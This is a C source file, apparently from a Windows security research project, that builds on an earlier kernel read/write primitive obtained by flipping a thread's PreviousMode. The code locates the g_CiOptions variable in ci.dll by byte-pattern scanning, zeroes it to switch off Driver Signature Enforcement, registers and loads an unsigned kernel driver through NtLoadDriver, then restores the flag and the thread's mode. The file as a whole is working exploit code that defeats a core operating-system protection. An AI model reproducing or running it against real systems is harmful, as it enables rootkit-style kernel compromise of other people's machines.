// https://github.com/kevoreilly

#include "..\\GMShellcode\\GMShellcode.h"
#include "Payload.h"
#include "Logging.h"
#include <psapi.h>

BOOL GodRead(PVOID KernelAddress, PVOID Buffer, SIZE_T Size)
{
    SIZE_T read = 0;
    NTSTATUS status = NtReadVirtualMemory(GetCurrentProcess(), KernelAddress, Buffer, Size, &read);
    return NT_SUCCESS(status);
}

BOOL GodWrite(PVOID KernelAddress, PVOID Buffer, SIZE_T Size)
{
    SIZE_T written = 0;
    NTSTATUS status = NtWriteVirtualMemory(GetCurrentProcess(), KernelAddress, Buffer, Size, &written);
    return NT_SUCCESS(status);
}

ULONG_PTR GetCiBase()
{
    LPVOID drivers[1024];
    DWORD cbNeeded;

	Log(Info, "GetCiBase: About to call EnumDeviceDrivers.");
    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
	{
        int count = cbNeeded / sizeof(LPVOID);
		Log(Info, "GetCiBase: count %u", count);
        for (int i = 0; i < count; i++)
		{
            WCHAR szDriver[MAX_PATH];
            if (GetDeviceDriverBaseNameW(drivers[i], szDriver, MAX_PATH))
			{
                if (_wcsicmp(szDriver, L"ci.dll") == 0)
                    return (ULONG_PTR)drivers[i];
            }
        }
    }
    return 0;
}

ULONG_PTR GetCiOptionsRVA()
{
    HMODULE hCi = LoadLibraryExW(L"ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!hCi)
		return 0;

    // Scan for the first MOV instruction in CipInitialize: 57 41 54 41 56 48 83 EC 40 49 8B E9 89 0D XX XX XX XX ...
    BYTE* ptr = (BYTE*)hCi;
    for (int i = 0; i < 1000000; i++)
	{
        if (ptr[i] == 0x57 && ptr[i+1] == 0x41 && ptr[i+2] == 0x54 && ptr[i+3] == 0x41 && ptr[i+4] == 0x56 && ptr[i+5] == 0x48 && ptr[i+6] == 0x83 && ptr[i+7] == 0xEC && ptr[i+8] == 0x40 && ptr[i+9] == 0x49 && ptr[i+10] == 0x8B && ptr[i+11] == 0xE9 && ptr[i+12] == 0x89 && ptr[i+13] == 0x0D)
		{
            INT32 relativeOffset = *(INT32*)(ptr + i + 14);
            ULONG_PTR RVA = ((ULONG_PTR)ptr - (ULONG_PTR)hCi) + i + 18 + relativeOffset;
            return RVA;
        }
    }
    return 0;
}

typedef NTSTATUS (NTAPI* NtLoadDriver_t)(PUNICODE_STRING DriverServiceName);
typedef NTSTATUS(NTAPI* NtUnloadDriver_t)(PUNICODE_STRING DriverServiceName);

NtLoadDriver_t   g_NtLoadDriver   = NULL;
NtUnloadDriver_t g_NtUnloadDriver = NULL;
UNICODE_STRING   g_NtRegistryPath = { 0 };
WCHAR            g_RegistryBuffer[MAX_PATH] = { 0 };

void GetBaseName(const wchar_t* path, wchar_t* dest, size_t destSize)
{
    if (!path || !dest || destSize == 0) return;

    const wchar_t* lastSlash = wcsrchr(path, L'\\');
    const wchar_t* lastForwardSlash = wcsrchr(path, L'/');
    const wchar_t* start = (lastSlash > lastForwardSlash) ? lastSlash : lastForwardSlash;

    start = (start != NULL) ? start + 1 : path;

    const wchar_t* dot = wcsrchr(start, L'.');
    size_t length = (dot != NULL) ? (size_t)(dot - start) : wcslen(start);

    if (length >= destSize) length = destSize - 1;

    wcsncpy_s(dest, destSize, start, length);
    dest[length] = L'\0';
}

WCHAR registryKeyPath[MAX_PATH];

BOOL RegisterDriver(LPCWSTR sysFileName)
{
    WCHAR fullPath[MAX_PATH];
    WCHAR baseName[MAX_PATH];
    HKEY hKey;

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll)
		return FALSE;

    g_NtLoadDriver = (NtLoadDriver_t)GetProcAddress(hNtdll, "NtLoadDriver");
    g_NtUnloadDriver = (NtUnloadDriver_t)GetProcAddress(hNtdll, "NtUnloadDriver");

    if (!g_NtLoadDriver)
	{
        Log(Info, "Failed to resolve NtLoadDriver.");
        return FALSE;
    }

    if (GetFullPathNameW(sysFileName, MAX_PATH, fullPath, NULL) == 0)
	{
        Log(Info, "Failed to get absolute path for %ls", sysFileName);
        return FALSE;
    }
	GetBaseName(sysFileName, baseName, MAX_PATH);

    WCHAR ntImagePath[MAX_PATH + 4];
    swprintf_s(ntImagePath, MAX_PATH + 4, L"\\??\\%s", fullPath);

    swprintf_s(registryKeyPath, MAX_PATH, L"System\\CurrentControlSet\\Services\\%s", baseName);

    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, registryKeyPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, NULL) != ERROR_SUCCESS)
	{
        Log(Info, "Failed to create registry service key.");
        return FALSE;
    }

    DWORD type  = 1; // SERVICE_KERNEL_DRIVER
    DWORD start = 3; // SERVICE_DEMAND_START
    DWORD error = 1; // SERVICE_ERROR_NORMAL

    RegSetValueExW(hKey, L"Type", 0, REG_DWORD, (BYTE*)&type, sizeof(DWORD));
    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&start, sizeof(DWORD));
    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&error, sizeof(DWORD));
    RegSetValueExW(hKey, L"ImagePath", 0, REG_SZ, (BYTE*)ntImagePath, (DWORD)((wcslen(ntImagePath) + 1) * sizeof(WCHAR)));

    RegCloseKey(hKey);

    swprintf_s(g_RegistryBuffer, MAX_PATH, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\%s", baseName);

    g_NtRegistryPath.Buffer = g_RegistryBuffer;
    g_NtRegistryPath.Length = (USHORT)(wcslen(g_RegistryBuffer) * sizeof(WCHAR));
    g_NtRegistryPath.MaximumLength = (USHORT)(g_NtRegistryPath.Length + sizeof(WCHAR));

    Log(Info, "Driver Registration Successful, NtLoadDriver 0x%p", g_NtLoadDriver);
    return TRUE;
}

ULONG g_CiOptions;

BOOL DisableDSE(ULONG_PTR gCiOptionsVA)
{
    g_CiOptions = 0xFF; // Sentinel value
    SIZE_T bytesRead = 0;
    SIZE_T bytesWritten = 0;

    if (!GodRead((PVOID)gCiOptionsVA, &g_CiOptions, sizeof(ULONG)))
	{
        Log(Error, "Initial GodRead failed at 0x%p", (PVOID)gCiOptionsVA);
		return FALSE;
	}

	Log(Info, "Current g_CiOptions value: 0x%02X", g_CiOptions);

	// Usually 0x06 or 0x0E on Win10/11
	if (g_CiOptions == 0)
	{
		Log(Error, "DSE is already disabled.");
		return FALSE;
	}

	ULONG patchValue = 0;
	if (!GodWrite((PVOID)gCiOptionsVA, &patchValue, sizeof(ULONG)))
	{
		Log(Error, "GodWrite failed to patch g_CiOptions.");
		return FALSE;
	}

	ULONG verifyOptions = 0xFF;
	if (!GodRead((PVOID)gCiOptionsVA, &verifyOptions, sizeof(ULONG)))
	{
		Log(Error, "Verification error! GodRead failed.", verifyOptions);
		return FALSE;
	}

	if (verifyOptions)
	{
		Log(Error, "Verification failed! Value is 0x%02X. HVCI is likely blocking the write.", verifyOptions);
		return FALSE;
	}

	Log(Info, "Driver Signature Enforcement disabled.");

	return TRUE;
}

BOOL RestoreDSE(ULONG_PTR gCiOptionsVA)
{
	if (!GodWrite((PVOID)gCiOptionsVA, &g_CiOptions, sizeof(ULONG)))
	{
		Log(Error, "GodWrite failed to restore g_CiOptions.");
		return FALSE;
	}

	Log(Info, "Driver Signature Enforcement restored.");

	return TRUE;
}

BOOL UnblessThread(DWORD ThreadId)
{
	if (ThreadId == NULL)
	{
		Log(Error, "UnblessThread: No thread ID.");
		return FALSE;
	}

	PVOID pThreadObject = FindKTHREAD(ThreadId);

	if (pThreadObject == NULL)
	{
		Log(Error, "UnblessThread: Could not find KTHREAD!");
		return FALSE;
	}

	char PreviousMode = NULL;
	if (!GodRead((PVOID)((ULONG_PTR)pThreadObject + ETHREAD_PREVIOUSMODE_OFFSET), &PreviousMode, sizeof(char)))
	{
		Log(Error, "UnblessThread: GodRead failed");
		return FALSE;
	}

	if (PreviousMode)
	{
		Log(Error, "UnblessThread: PreviousMode %u", PreviousMode);
		return FALSE;
	}

	PreviousMode = 1;
	if (!GodWrite((PVOID)((ULONG_PTR)pThreadObject + ETHREAD_PREVIOUSMODE_OFFSET), &PreviousMode, sizeof(char)))
	{
		Log(Error, "UnblessThread: GodWrite failed");
		return FALSE;
	}

	Log(Info, "Unblessed thread %u!", ThreadId);

	return TRUE;
}

ULONG_PTR CiBase, CiOptionsRVA;
NTSTATUS g_FinalLoadStatus;
HANDLE g_hWorkerThread;

DWORD WINAPI DriverLoaderWorker(LPVOID lpParam)
{
    g_FinalLoadStatus = g_NtLoadDriver(&g_NtRegistryPath);

	if (NT_SUCCESS(g_FinalLoadStatus))
		Log(Info, "Driver loaded successfully.");
	else
		Log(Info, "Driver load failed.");

	RegDeleteKeyW(HKEY_LOCAL_MACHINE, registryKeyPath);

    return 0;
}

void PrepDriverLoad(LPCWSTR DriverName)
{
    CiBase = GetCiBase();
	if (!CiBase)
	{
		Log(Error, "PrepDriverLoad: Failed to obtain ci.dll base address.");
		return;
	}
	Log(Info, "CiBase 0x%p", CiBase);

	CiOptionsRVA = GetCiOptionsRVA();
	if (!CiOptionsRVA)
	{
		Log(Error, "PrepDriverLoad: Failed to obtain g_CiOptions RVA.");
		return;
	}
	Log(Info, "CiOptions RVA 0x%p", CiOptionsRVA);

	RegisterDriver(DriverName);

	g_hWorkerThread = CreateThread(NULL, 0, DriverLoaderWorker, NULL, CREATE_SUSPENDED, NULL);
}

void DoDriverLoad()
{
	if (!CiBase || !CiOptionsRVA)
		return;

	DisableDSE(CiBase + CiOptionsRVA);

	ResumeThread(g_hWorkerThread);

	WaitForSingleObject(g_hWorkerThread, INFINITE);

	RestoreDSE(CiBase + CiOptionsRVA);

	UnblessThread(GetCurrentThreadId());
}
